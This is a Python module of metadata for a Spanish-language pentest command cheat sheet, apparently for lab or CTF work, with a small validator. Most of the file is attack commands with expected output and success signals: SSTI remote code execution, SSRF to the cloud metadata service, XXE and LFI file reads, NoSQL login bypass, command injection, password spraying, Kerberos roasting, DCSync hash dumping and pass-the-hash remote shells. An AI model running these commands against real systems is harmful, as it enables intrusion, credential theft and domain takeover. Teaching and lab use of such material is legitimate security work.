"""Curated, verifiable metadata for the highest-value command cards.

The command string remains the source of truth; records are linked by the
section slug and a whitespace-normalised command.
"""
from __future__ import annotations

import re
from datetime import date
from typing import Any, Iterable
from urllib.parse import urlparse


ENUMS = {
    "environment": {"kali", "linux", "windows", "target", "attacker", "cross-platform"},
    "targetOS": {"linux", "windows", "network", "web", "any"},
    "credentialType": {"none", "password", "hash", "key", "token", "mixed"},
    "noise": {"silent", "low", "medium", "high"},
    "risk": {"safe", "caution", "intrusive"},
}


def normalize_command(command: str) -> str:
    return " ".join(str(command).strip().split())


def _record(section: str, command: str, objective: str, tool: str, *, environment="kali",
            target_os="network", credentials=False, credential_type="none",
            privileges="user", noise="low", risk="safe", preconditions=(),
            expected="", success="", errors=(), alternative="", version="2025.1") -> dict[str, Any]:
    return {
        "sectionSlug": section,
        "command": command,
        "objective": objective,
        "tool": tool,
        "environment": environment,
        "targetOS": target_os,
        "credentialsRequired": credentials,
        "credentialType": credential_type,
        "privileges": privileges,
        "noise": noise,
        "risk": risk,
        "preconditions": list(preconditions),
        "expectedOutput": expected or "Salida del comando para decidir el siguiente paso.",
        "successSignal": success or "La salida contiene datos accionables.",
        "commonErrors": list(errors) or ["Variable o ruta no definida."],
        "alternative": alternative,
        "checkedVersion": version,
        "reviewedAt": "2026-07-11",
    }


COMMAND_METADATA = [
    _record("ultra-quick-start", "nmap -p- -Pn -n --min-rate 5000 $IP -oN nmap/all_ports.txt", "Descubrir todos los puertos TCP", "nmap", target_os="network", noise="medium", expected="Lista de puertos abiertos.", success="Aparecen puertos abiertos en la salida.", alternative="rustscan -a $IP -- -Pn"),
    _record("ultra-quick-start", "nmap -sC -sV -Pn -p <PUERTOS> $IP -oN nmap/services.txt", "Identificar servicios y versiones", "nmap", target_os="network", noise="medium", preconditions=("Tener una lista de puertos abiertos",), expected="Versiones y banners por servicio.", success="Cada puerto tiene servicio/version."),
    _record("recon-y-servicios", "whatweb $URL", "Fingerprint de la aplicación web", "whatweb", target_os="web", noise="low", expected="Tecnologías, framework y cabeceras detectadas.", success="Se identifica producto o framework."),
    _record("recon-y-servicios", "curl -sSI $URL", "Obtener cabeceras HTTP", "curl", target_os="web", noise="silent", expected="Status, cabeceras y redirecciones.", success="Aparece un código HTTP y Server/Location."),
    _record("web-discovery", "ffuf -u \"$URL/FUZZ\" -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.html -fc 404", "Enumerar rutas web", "ffuf", target_os="web", noise="high", risk="caution", preconditions=("URL accesible", "Wordlist instalada"), expected="Rutas que no devuelven 404.", success="Hay respuestas 200, 3xx o 403 interesantes.", errors=("Filtrado de tamaño incorrecto", "WAF bloquea el volumen"), alternative="gobuster dir -u $URL -w wordlist.txt"),
    _record("web-discovery", "gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -b 404", "Enumerar directorios y ficheros", "gobuster", target_os="web", noise="high", risk="caution", expected="Rutas HTTP existentes.", success="Aparecen rutas con status distinto de 404.", alternative="feroxbuster -u $URL"),
    _record("web-discovery", "feroxbuster -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html", "Descubrir contenido web recursivo", "feroxbuster", target_os="web", noise="high", risk="caution", expected="Rutas y extensiones descubiertas.", success="Se encuentran endpoints no enlazados."),
    _record("credenciales-y-acceso", "ssh $USER@$IP", "Probar acceso SSH con una identidad", "ssh", target_os="linux", credentials=True, credential_type="mixed", noise="low", preconditions=("Usuario y host válidos",), expected="Prompt de shell remoto.", success="Se obtiene una sesión SSH.", errors=("Permission denied", "Host key desconocida"), alternative="ssh -i key $USER@$IP"),
    _record("credenciales-y-acceso", "smbclient -L //$IP -U '$USER%$PASS'", "Enumerar shares SMB autenticados", "smbclient", target_os="windows", credentials=True, credential_type="password", noise="low", expected="Lista de shares y permisos.", success="Se listan shares accesibles."),
    _record("credenciales-y-acceso", "nxc winrm $IP -u $USER -p $PASS", "Validar credencial y ejecución WinRM", "netexec", target_os="windows", credentials=True, credential_type="password", noise="low", expected="Estado de autenticación y Pwn3d.", success="Aparece (Pwn3d!) o autenticación válida.", errors=("Clock skew", "STATUS_LOGON_FAILURE")),
    _record("acceso-inicial", "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'", "Estabilizar una shell interactiva", "python", environment="target", target_os="linux", privileges="user", expected="TTY con edición y señales normales.", success="El prompt permite usar Ctrl-C y completar comandos."),
    _record("acceso-inicial", "python3 -m http.server 8000", "Servir herramientas para transferencia", "python", environment="attacker", target_os="any", noise="low", preconditions=("Estar en el directorio de herramientas",), expected="Servidor HTTP escuchando en 8000.", success="El target puede descargar el fichero."),
    _record("linux-privesc", "whoami; id; groups; hostname; pwd", "Tomar contexto de la shell Linux", "coreutils", environment="target", target_os="linux", expected="Usuario, grupos, host y directorio actual.", success="La identidad y grupos están documentados."),
    _record("linux-privesc", "find / -perm -4000 -type f -ls 2>/dev/null", "Enumerar binarios SUID", "find", environment="target", target_os="linux", noise="medium", expected="Ficheros SUID potencialmente abusables.", success="Se identifica un SUID no estándar.", alternative="linpeas.sh"),
    _record("linux-privesc", "sudo -l", "Comprobar reglas sudo del usuario", "sudo", environment="target", target_os="linux", credentials=True, credential_type="password", noise="silent", expected="Comandos permitidos y NOPASSWD.", success="Aparece una regla sudo utilizable.", errors=("sudo: a password is required", "User is not in the sudoers file")),
    _record("windows-privesc", "whoami /priv", "Enumerar privilegios del token Windows", "whoami", environment="target", target_os="windows", expected="Privilegios habilitados como SeImpersonatePrivilege.", success="Hay un privilegio especial habilitado."),
    _record("windows-privesc", "whoami /groups", "Enumerar grupos Windows", "whoami", environment="target", target_os="windows", expected="SID y grupos del usuario.", success="Se detecta grupo privilegiado o de interés."),
    _record("active-directory", "nmap -sC -sV -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,5986 $IP", "Confirmar superficie de un dominio", "nmap", target_os="windows", noise="medium", expected="Puertos típicos de AD y sus versiones.", success="Aparecen DNS/Kerberos/LDAP/SMB."),
    _record("active-directory", "nxc smb $IP", "Obtener dominio, nombre y capacidades SMB", "netexec", target_os="windows", noise="low", expected="Hostname, dominio y signing.", success="Se identifica el dominio o un acceso válido."),
    _record("pivoting", "ip route", "Descubrir redes alcanzables desde el host", "ip", environment="target", target_os="linux", noise="silent", expected="Tabla de rutas y subredes internas.", success="Aparece una red no visible desde Kali."),
    _record("pivoting", "ssh -L 8080:127.0.0.1:80 user@$IP", "Crear port-forward local SSH", "ssh", credentials=True, credential_type="password", target_os="linux", noise="low", preconditions=("SSH accesible y servicio local en el target",), expected="Puerto local 8080 conectado al servicio remoto.", success="curl http://127.0.0.1:8080 responde."),
    _record("cve-y-exploits", "searchsploit PRODUCT VERSION", "Buscar exploits públicos para una versión", "searchsploit", target_os="any", noise="silent", expected="CVE y PoC relacionados.", success="Se encuentra una entrada aplicable.", alternative="Consultar el NVD y el repositorio del proyecto."),
    _record("cve-y-exploits", "python3 exploit.py -h", "Revisar uso y opciones de una PoC", "python", target_os="any", noise="silent", risk="safe", expected="Argumentos requeridos y modo check.", success="La PoC muestra ayuda sin ejecutar el exploit."),

    # --- Web: payloads "cripticos" que merecen explicacion de que hacen y que esperar ---
    _record("web-inyecciones", 'curl -sS "$URL/?name={{7*7}}"', "Detectar Server-Side Template Injection", "curl", target_os="web", noise="low", risk="caution", expected="Si el parametro se evalua, la respuesta contiene 49 en vez del texto literal.", success="La pagina devuelve 49 (el motor de plantillas evaluo tu input).", errors=("El framework escapa el input: no es vulnerable", "El parametro no se refleja"), alternative="Prueba ${7*7}, #{7*7} o <%= 7*7 %> segun el motor."),
    _record("web-inyecciones", "curl -sS \"$URL/?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}\"", "Ejecutar comandos via SSTI (Jinja2)", "curl", target_os="web", noise="medium", risk="intrusive", credentials=False, preconditions=("SSTI confirmada en un motor tipo Jinja2/Flask",), expected="La respuesta incluye la salida de id (uid=...).", success="Se ejecuta id en el servidor: es RCE.", errors=("El sandbox del motor bloquea __globals__", "Motor distinto de Jinja2")),
    _record("web-inyecciones", 'curl -sS "$URL/fetch?url=http://169.254.169.254/latest/meta-data/"', "SSRF contra el endpoint de metadatos cloud", "curl", target_os="web", noise="low", risk="caution", expected="Datos del servicio de metadatos (roles/credenciales IAM en AWS).", success="Devuelve metadatos en vez de un error de conexion.", errors=("No es un entorno cloud", "IMDSv2 exige un token: prueba la cabecera"), alternative="Rutas gcp: metadata.google.internal."),
    _record("web-inyecciones", 'curl -sS "$URL/fetch?url=http://127.0.0.1:80/"', "Confirmar SSRF apuntando al propio host", "curl", target_os="web", noise="low", risk="caution", expected="La respuesta de un servicio interno que no deberias alcanzar desde fuera.", success="Ves contenido de 127.0.0.1 servido por el backend.", errors=("Lista blanca de dominios", "El puerto interno esta cerrado")),
    _record("web-inyecciones", "curl -sS -X POST $URL/upload --data-binary @xxe.xml -H 'Content-Type: application/xml'", "Leer ficheros del servidor via XXE", "curl", target_os="web", noise="low", risk="intrusive", preconditions=("El endpoint parsea XML", "Haber creado xxe.xml con la entidad externa"), expected="El contenido de /etc/passwd embebido en la respuesta.", success="Aparece root:x:0:0 en la salida.", errors=("Parser con entidades externas deshabilitadas (seguro)",)),
    _record("web-inyecciones", 'curl -sS -X POST $URL/login -H \'Content-Type: application/json\' -d \'{"username":{"$ne":null},"password":{"$ne":null}}\'', "Bypass de login por NoSQL injection", "curl", target_os="web", noise="low", risk="intrusive", expected="Redireccion o token como si las credenciales fueran validas.", success="Entras sin conocer la contrasena (el operador $ne siempre es verdadero).", errors=("El backend no es NoSQL (Mongo)", "Valida tipos del JSON")),
    _record("web-inyecciones", 'curl -sS -X POST "$URL/api/ping" -H \'Content-Type: application/json\' -d \'{"host":"127.0.0.1; id"}\'', "Inyeccion de comandos en un parametro", "curl", target_os="web", noise="medium", risk="intrusive", expected="La respuesta incluye uid=... porque id se ejecuto tras tu valor.", success="Se ejecuta id concatenado: hay command injection.", errors=("Input saneado o sin paso por shell", "Prueba separadores | && $() `id`")),
    _record("web-ficheros-y-ejecucion", 'curl -sS "$URL/page.php?file=../../../../etc/passwd"', "Local File Inclusion: leer un fichero del sistema", "curl", target_os="web", noise="low", risk="caution", expected="El contenido de /etc/passwd si el parametro incluye ficheros.", success="Aparece root:x:0:0: la ruta es controlable.", errors=("Filtro de path traversal", "Base dir fija / extension forzada"), alternative="php://filter/convert.base64-encode/resource=index para leer el codigo fuente."),
    _record("web-apis-y-autorizacion", 'curl -sS "$URL/api/users/1001" -H "Authorization: Bearer $TOKEN"', "Probar IDOR cambiando el id de otro usuario", "curl", target_os="web", credentials=True, credential_type="token", noise="low", risk="caution", expected="Datos de un usuario que no es el tuyo.", success="Accedes a un recurso ajeno con tu propio token.", errors=("El backend valida la propiedad del recurso (403)",)),
    _record("web-apis-y-autorizacion", 'curl -sS -X POST $URL/graphql -H \'Content-Type: application/json\' -d \'{"query":"{__schema{types{name}}}"}\'', "Volcar el esquema GraphQL (introspection)", "curl", target_os="web", noise="low", risk="safe", expected="La lista de todos los tipos y queries de la API.", success="Devuelve el esquema: usalo para encontrar queries sensibles.", errors=("Introspection deshabilitada en produccion",)),
    _record("web-apis-y-autorizacion", r'for m in GET POST PUT DELETE PATCH OPTIONS HEAD; do echo -n "$m "; curl -s -o /dev/null -w "%{http_code}\n" -X $m "$URL/api/resource"; done', "Descubrir metodos HTTP permitidos en un endpoint", "curl", target_os="web", noise="low", risk="caution", expected="El codigo de estado por cada metodo probado.", success="Un metodo peligroso (PUT/DELETE) responde 2xx.", alternative="curl -i -X OPTIONS $URL para leer la cabecera Allow."),

    # --- Recon / AD: sesiones nulas y contexto LDAP ---
    _record("active-directory", "smbclient -L //$IP -N", "Listar shares SMB con sesion nula", "smbclient", target_os="windows", noise="low", risk="safe", expected="Los shares visibles sin autenticar.", success="Se listan shares (hay null session).", errors=("STATUS_ACCESS_DENIED: no hay sesion nula",), alternative="nxc smb $IP -u '' -p '' --shares"),
    _record("recon-y-servicios", "nxc smb $IP -u '' -p '' --shares", "Enumerar shares con sesion nula (NetExec)", "netexec", target_os="windows", noise="low", risk="safe", expected="Shares y permisos de lectura/escritura sin credenciales.", success="Aparecen shares legibles para seguir enumerando.", errors=("El servidor rechaza la sesion nula",)),
    _record("recon-y-servicios", "ldapsearch -x -H ldap://$IP -s base namingContexts", "Obtener el naming context base del LDAP", "ldapsearch", target_os="windows", noise="silent", risk="safe", expected="El DN base del dominio (DC=dominio,DC=local).", success="Devuelve namingContexts para acotar futuras consultas.", errors=("Bind anonimo deshabilitado",)),

    # --- Cracking: elegir el modo correcto ---
    _record("hashes-y-cracking", "hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt", "Crackear un hash NTLM con diccionario", "hashcat", environment="attacker", target_os="any", credential_type="hash", noise="silent", risk="safe", preconditions=("Hash NTLM guardado en ntlm.hash", "rockyou disponible"), expected="La contrasena en claro si esta en el diccionario.", success="hashcat marca el hash como Cracked.", errors=("Modo -m incorrecto para el tipo de hash", "Formato del fichero de hash mal"), alternative="john --format=nt ntlm.hash"),
    _record("hashes-y-cracking", "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt", "Crackear hashes con John y diccionario", "john", environment="attacker", target_os="any", credential_type="hash", noise="silent", risk="safe", expected="Contrasenas recuperadas (se ven luego con john --show).", success="John encuentra al menos una contrasena.", errors=("John no reconoce el formato: pasa --format",), alternative="hashcat con el -m correspondiente al tipo de hash."),

    # --- Lote 1: Active Directory (enum, kerberos, lateral, dump) ---
    _record("active-directory", "nxc smb $IP -u 'Guest' -p '' --shares", "Listar shares con la cuenta Guest", "netexec", target_os="windows", noise="low", risk="safe", expected="Shares visibles y tus permisos con Guest.", success="Se listan shares legibles sin credenciales reales.", errors=("Guest deshabilitado",)),
    _record("active-directory", "nxc smb $IP -u 'Guest' -p '' --rid-brute > rid.txt", "Enumerar usuarios del dominio por RID cycling", "netexec", target_os="windows", noise="low", risk="caution", expected="Lista de usuarios y grupos del dominio (SID -> nombre).", success="rid.txt se llena de cuentas del dominio.", errors=("Acceso denegado: sin sesion nula/guest",), alternative="impacket-lookupsid"),
    _record("active-directory", "impacket-lookupsid $DOMAIN/guest@$IP -no-pass", "Sacar usuarios del dominio por fuerza de SID", "impacket", target_os="windows", noise="low", risk="caution", expected="Nombres de cuentas resueltos desde sus RIDs.", success="Aparece la lista de usuarios del dominio.", errors=("Requiere sesion nula o guest",)),
    _record("active-directory", "ldapsearch -x -H ldap://$IP -b 'DC=dominio,DC=local' '(objectClass=user)' sAMAccountName", "Enumerar usuarios via LDAP", "ldapsearch", target_os="windows", noise="silent", risk="safe", credentials=False, expected="Los sAMAccountName de todas las cuentas de usuario.", success="Se listan usuarios para spraying/roasting.", errors=("Bind anonimo deshabilitado: usa credenciales",)),
    _record("active-directory", "kerbrute userenum -d $DOMAIN --dc $DC_FQDN /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt", "Descubrir usuarios validos via Kerberos", "kerbrute", target_os="windows", noise="low", risk="caution", expected="Los usuarios que existen en el dominio (VALID USERNAME).", success="kerbrute marca cuentas validas sin bloquearlas.", errors=("DC_FQDN mal resuelto: revisa /etc/hosts",)),
    _record("active-directory", "nxc smb $IP -u users.txt -p 'Password1!' --continue-on-success", "Password spraying una clave contra muchos usuarios", "netexec", target_os="windows", credentials=True, credential_type="password", noise="medium", risk="caution", preconditions=("Lista de usuarios validos", "Cuidado con la politica de bloqueo"), expected="Que usuarios aceptan esa contrasena (marca [+]).", success="Aparece un [+] dominio\\usuario:clave valido.", errors=("Bloqueo de cuentas si te pasas de intentos",)),
    _record("active-directory", "kerbrute passwordspray -d $DOMAIN --dc $DC_FQDN users.txt 'Password1!'", "Password spraying via Kerberos", "kerbrute", target_os="windows", credentials=True, credential_type="password", noise="low", risk="caution", expected="Los usuarios cuya contrasena es esa.", success="kerbrute marca un login valido.", errors=("Politica de bloqueo del dominio",)),
    _record("active-directory", "impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $IP", "AS-REP roasting sin credenciales", "impacket", target_os="windows", noise="low", risk="caution", preconditions=("Lista de usuarios candidatos",), expected="Hashes AS-REP de cuentas con preauth deshabilitada.", success="Sale un hash $krb5asrep$ para crackear.", errors=("Ninguna cuenta tiene 'Do not require preauth'",), alternative="hashcat -m 18200"),
    _record("active-directory", "impacket-GetNPUsers $DOMAIN/$USER:$PASS -request -dc-ip $IP -outputfile asrep.hash", "AS-REP roasting autenticado", "impacket", target_os="windows", credentials=True, credential_type="password", noise="low", risk="caution", expected="asrep.hash con los hashes AS-REP del dominio.", success="El fichero contiene al menos un $krb5asrep$.", errors=("Sin cuentas vulnerables a AS-REP",)),
    _record("active-directory", "hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt", "Crackear un hash AS-REP", "hashcat", environment="attacker", target_os="any", credential_type="hash", noise="silent", risk="safe", preconditions=("Tener asrep.hash",), expected="La contrasena de la cuenta AS-REP.", success="hashcat marca Cracked con la clave.", errors=("La clave no esta en el diccionario",)),
    _record("active-directory", "impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $IP -request -outputfile kerb.hash", "Kerberoasting: pedir TGS de cuentas de servicio", "impacket", target_os="windows", credentials=True, credential_type="password", noise="low", risk="caution", preconditions=("Una credencial de dominio valida",), expected="kerb.hash con hashes TGS de cuentas con SPN.", success="Sale un $krb5tgs$ para crackear offline.", errors=("No hay cuentas con SPN (kerberoastables)",), alternative="hashcat -m 13100"),
    _record("active-directory", "hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt", "Crackear un hash Kerberoast (TGS)", "hashcat", environment="attacker", target_os="any", credential_type="hash", noise="silent", risk="safe", expected="La contrasena de la cuenta de servicio.", success="hashcat marca Cracked (suele ser cuenta con privilegios).", errors=("La clave no esta en el diccionario",)),
    _record("active-directory", "bloodhound-python -d $DOMAIN -u $USER -p $PASS -c all -ns $IP --zip", "Recolectar datos de AD para BloodHound", "bloodhound-python", target_os="windows", credentials=True, credential_type="password", noise="medium", risk="caution", expected="Un .zip con usuarios, grupos, sesiones y ACLs.", success="Se genera el zip para cargar en BloodHound.", errors=("DNS/-ns mal configurado", "Reloj desincronizado (Kerberos)"), alternative="nxc ldap ... --bloodhound"),
    _record("active-directory", "impacket-secretsdump $DOMAIN/$USER:$PASS@$IP", "Volcar hashes locales (SAM/LSA) de un host", "impacket", target_os="windows", credentials=True, credential_type="password", noise="medium", risk="intrusive", privileges="admin", preconditions=("Ser admin local en el objetivo",), expected="Hashes NTLM de cuentas locales y secretos LSA.", success="Salen hashes Administrator:500:... para PtH/crackeo.", errors=("Sin privilegios de admin local",)),
    _record("active-directory", "impacket-secretsdump -just-dc $DOMAIN/$USER:$PASS@$DC_FQDN", "DCSync: volcar los hashes del dominio", "impacket", target_os="windows", credentials=True, credential_type="password", noise="high", risk="intrusive", privileges="admin", preconditions=("Cuenta con derechos de replicacion (DA o similar)",), expected="Todos los hashes NTLM del dominio, incluido krbtgt.", success="Aparece el hash de krbtgt y de administrator.", errors=("Sin permisos de replicacion (no eres DA)",)),
    _record("active-directory", "nxc smb $IP -u $USER -H <NTLM>", "Validar un hash NTLM (pass-the-hash)", "netexec", target_os="windows", credentials=True, credential_type="hash", noise="low", risk="caution", expected="Si el hash vale en ese host (marca Pwn3d! si eres admin).", success="Autentica sin conocer la contrasena en claro.", errors=("El hash no es valido en ese host",)),
    _record("active-directory", "impacket-psexec $DOMAIN/$USER@$IP -hashes :<NTLM>", "Shell SYSTEM remota con pass-the-hash", "impacket", target_os="windows", credentials=True, credential_type="hash", noise="high", risk="intrusive", privileges="admin", preconditions=("Hash de un admin local",), expected="Una shell como NT AUTHORITY\\SYSTEM.", success="Obtienes prompt remoto con privilegios maximos.", errors=("Ruidoso: crea un servicio (deteccion facil)",), alternative="wmiexec (mas sigiloso)"),
    _record("active-directory", "evil-winrm -i $IP -u $USER -p $PASS", "Shell interactiva por WinRM", "evil-winrm", target_os="windows", credentials=True, credential_type="password", noise="low", risk="caution", preconditions=("Puerto 5985 abierto y usuario en Remote Management Users",), expected="Una PowerShell remota en el objetivo.", success="Entras en la shell de evil-winrm.", errors=("WinRM cerrado o usuario sin permiso",)),
    _record("active-directory", "evil-winrm -i $IP -u $USER -H <NTLM>", "Shell WinRM con pass-the-hash", "evil-winrm", target_os="windows", credentials=True, credential_type="hash", noise="low", risk="caution", expected="PowerShell remota usando el hash NTLM.", success="Entras sin la contrasena en claro.", errors=("El usuario no tiene acceso WinRM",)),
    _record("active-directory", "impacket-wmiexec $DOMAIN/$USER:$PASS@$IP", "Ejecucion remota sigilosa via WMI", "impacket", target_os="windows", credentials=True, credential_type="mixed", noise="low", risk="intrusive", privileges="admin", expected="Una semi-shell que ejecuta comandos por WMI.", success="Ejecutas comandos sin crear un servicio (mas silencioso que psexec).", errors=("Requiere admin local",), alternative="psexec / smbexec"),
    _record("active-directory", "certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $IP -vulnerable -stdout", "Buscar plantillas de certificado vulnerables (AD CS)", "certipy", target_os="windows", credentials=True, credential_type="password", noise="low", risk="caution", expected="Plantillas con ESC1-ESC8 y la CA vulnerable.", success="Aparece una plantilla marcada como vulnerable.", errors=("No hay AD CS o ninguna plantilla vulnerable",)),
    _record("active-directory", "certipy auth -pfx administrator.pfx -dc-ip $IP", "Autenticarse con un certificado y sacar el hash", "certipy", target_os="windows", credential_type="key", noise="low", risk="intrusive", preconditions=("Tener el .pfx emitido a un usuario privilegiado",), expected="El TGT y el hash NTLM del usuario del certificado.", success="Obtienes el hash de administrator para PtH.", errors=("Reloj desincronizado (Kerberos)",)),
]


def validate_command_metadata(metadata: Iterable[dict[str, Any]], sections: Iterable[dict[str, Any]], *, today: date | None = None) -> list[str]:
    """Return all contract violations (orphans, duplicates, enums and dates)."""
    section_commands = {(s["slug"], normalize_command(c)) for s in sections for c in s.get("commands", [])}
    errors: list[str] = []
    seen: set[tuple[str, str]] = set()
    today = today or date.today()
    required = {"sectionSlug", "command", "objective", "tool", "environment", "targetOS", "credentialsRequired", "credentialType", "privileges", "noise", "risk", "preconditions", "expectedOutput", "successSignal", "commonErrors", "alternative", "checkedVersion", "reviewedAt"}
    for index, item in enumerate(metadata):
        missing = required - item.keys()
        if missing:
            errors.append(f"metadata[{index}] missing fields: {sorted(missing)}")
        key = (str(item.get("sectionSlug", "")), normalize_command(item.get("command", "")))
        if key in seen:
            errors.append(f"duplicate metadata key: {key}")
        seen.add(key)
        if key not in section_commands:
            errors.append(f"orphan metadata reference: {key}")
        for field, values in ENUMS.items():
            if item.get(field) not in values:
                errors.append(f"metadata[{index}] invalid {field}: {item.get(field)!r}")
        if not isinstance(item.get("credentialsRequired"), bool):
            errors.append(f"metadata[{index}] credentialsRequired must be boolean")
        try:
            reviewed = date.fromisoformat(str(item.get("reviewedAt")))
            if reviewed > today:
                errors.append(f"metadata[{index}] reviewedAt is in the future")
        except ValueError:
            errors.append(f"metadata[{index}] invalid reviewedAt")
        if not re.match(r"^\d+(?:\.\d+){0,2}(?:[-+][0-9A-Za-z.-]+)?$", str(item.get("checkedVersion", ""))):
            errors.append(f"metadata[{index}] invalid checkedVersion")
        reference = item.get("reference")
        if reference and urlparse(str(reference)).scheme not in {"http", "https"}:
            errors.append(f"metadata[{index}] invalid reference URL")
    return errors


__all__ = ["COMMAND_METADATA", "ENUMS", "normalize_command", "validate_command_metadata"]
